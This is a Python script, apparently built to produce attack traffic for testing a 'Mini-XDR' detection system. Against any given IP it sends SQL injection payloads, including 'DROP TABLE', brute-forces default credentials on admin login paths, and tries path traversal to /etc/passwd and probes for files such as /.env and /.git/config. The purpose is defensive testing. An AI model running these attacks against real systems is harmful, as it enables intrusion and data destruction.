#!/usr/bin/env python3
"""
🎯 Simple Mini-XDR Attack Test
=============================

A focused attack script to quickly test your Mini-XDR detection and response capabilities.

Usage on Kali Linux:
    python3 simple_attack_test.py <TARGET_IP>
"""

import requests
import time
import sys
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def setup_session():
    """Setup requests session with retries"""
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def run_web_attacks(target_ip, session):
    """Run web application attacks that should trigger Mini-XDR"""
    
    print(f"🚨 Starting web attacks against {target_ip}")
    
    # Known malicious user agents (threat intel indicators)
    malicious_agents = [
        "sqlmap/1.4.7#stable (http://sqlmap.org)",
        "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
        "Nikto/2.1.6",
        "DirBuster-1.0-RC1",
    ]
    
    # SQL Injection attacks
    sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --", 
        "admin'--",
        "' UNION SELECT 1,2,3--",
        "'; DROP TABLE users; --"
    ]
    
    base_url = f"http://{target_ip}"
    
    for i in range(20):  # 20 attack attempts
        try:
            # Random malicious user agent
            headers = {'User-Agent': random.choice(malicious_agents)}
            
            # SQL injection attempt
            payload = random.choice(sql_payloads)
            params = {'id': payload, 'search': payload, 'user': payload}
            
            response = session.get(base_url, params=params, headers=headers, timeout=5)
            print(f"[{i+1:2d}/20] SQL Attack: {payload[:30]:<30} -> HTTP {response.status_code}")
            
            time.sleep(1)  # 1 second between attacks
            
        except requests.exceptions.RequestException as e:
            print(f"[{i+1:2d}/20] SQL Attack: {payload[:30]:<30} -> Connection failed")
            time.sleep(1)
    
    print("✅ Web attacks completed")

def run_brute_force(target_ip, session):
    """Run brute force login attempts"""
    
    print(f"\n🔐 Starting brute force attacks against {target_ip}")
    
    login_attempts = [
        ("admin", "admin"),
        ("admin", "password"), 
        ("admin", "123456"),
        ("root", "root"),
        ("administrator", "password"),
        ("user", "user"),
        ("test", "test")
    ]
    
    login_paths = ["/login", "/admin", "/wp-admin", "/administrator"]
    
    for i, (username, password) in enumerate(login_attempts):
        try:
            for path in login_paths:
                url = f"http://{target_ip}{path}"
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) Hydra'}
                data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'login': 'Login'
                }
                
                response = session.post(url, data=data, headers=headers, timeout=5)
                print(f"[{i+1:2d}/7] Brute Force: {username}:{password} -> {path} -> HTTP {response.status_code}")
                
                time.sleep(0.5)
                
        except requests.exceptions.RequestException:
            print(f"[{i+1:2d}/7] Brute Force: {username}:{password} -> Connection failed")
    
    print("✅ Brute force attacks completed")

def run_directory_traversal(target_ip, session):
    """Run directory traversal attacks"""
    
    print(f"\n📁 Starting directory traversal attacks against {target_ip}")
    
    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd"
    ]
    
    for i, payload in enumerate(traversal_payloads):
        try:
            url = f"http://{target_ip}/{payload}"
            headers = {'User-Agent': 'DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)'}
            
            response = session.get(url, headers=headers, timeout=5)
            print(f"[{i+1:2d}/4] Dir Traversal: {payload:<40} -> HTTP {response.status_code}")
            
            time.sleep(1)
            
        except requests.exceptions.RequestException:
            print(f"[{i+1:2d}/4] Dir Traversal: {payload:<40} -> Connection failed")
    
    print("✅ Directory traversal attacks completed")

def run_reconnaissance(target_ip, session):
    """Run reconnaissance activities"""
    
    print(f"\n🔍 Starting reconnaissance against {target_ip}")
    
    recon_paths = [
        "/robots.txt",
        "/admin/",
        "/phpmyadmin/",
        "/.env",
        "/wp-config.php",
        "/config.php",
        "/backup.sql",
        "/.git/config"
    ]
    
    for i, path in enumerate(recon_paths):
        try:
            url = f"http://{target_ip}{path}"
            headers = {'User-Agent': 'gobuster/3.1.0'}
            
            response = session.get(url, headers=headers, timeout=5)
            print(f"[{i+1:2d}/8] Recon: {path:<20} -> HTTP {response.status_code}")
            
            time.sleep(0.5)
            
        except requests.exceptions.RequestException:
            print(f"[{i+1:2d}/8] Recon: {path:<20} -> Connection failed")
    
    print("✅ Reconnaissance completed")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 simple_attack_test.py <TARGET_IP>")
        print("Example: python3 simple_attack_test.py 192.168.1.100")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                🎯 MINI-XDR ATTACK TEST SCRIPT 🎯             ║
║                                                              ║
║  Target: {target_ip:<52} ║
║                                                              ║
║  This script will generate malicious traffic to test your   ║
║  Mini-XDR detection and response capabilities.              ║
║                                                              ║
║  ⚠️  Only use against systems you own!                       ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Setup session
    session = setup_session()
    
    try:
        # Run different types of attacks
        run_web_attacks(target_ip, session)
        run_brute_force(target_ip, session)
        run_directory_traversal(target_ip, session)
        run_reconnaissance(target_ip, session)
        
        print(f"""
🎉 Attack simulation completed successfully!

📊 What should happen in your Mini-XDR:
   ✓ Multiple incidents should be created
   ✓ High risk scores due to malicious patterns
   ✓ Threat intelligence hits on user agents
   ✓ ML detection of attack patterns
   
🛡️  Test your SOC response actions:
   • Click "Block IP" to block the attacking IP
   • Use "Threat Intel" to lookup IOCs
   • Try "Hunt Similar" to find related attacks
   • Use "Isolate Host" for containment
   
💡 Check the SOC dashboard at http://localhost:3000
        """)
        
    except KeyboardInterrupt:
        print("\n\n🛑 Attack test interrupted by user")
    except Exception as e:
        print(f"\n❌ Error during attack test: {e}")

if __name__ == "__main__":
    main()

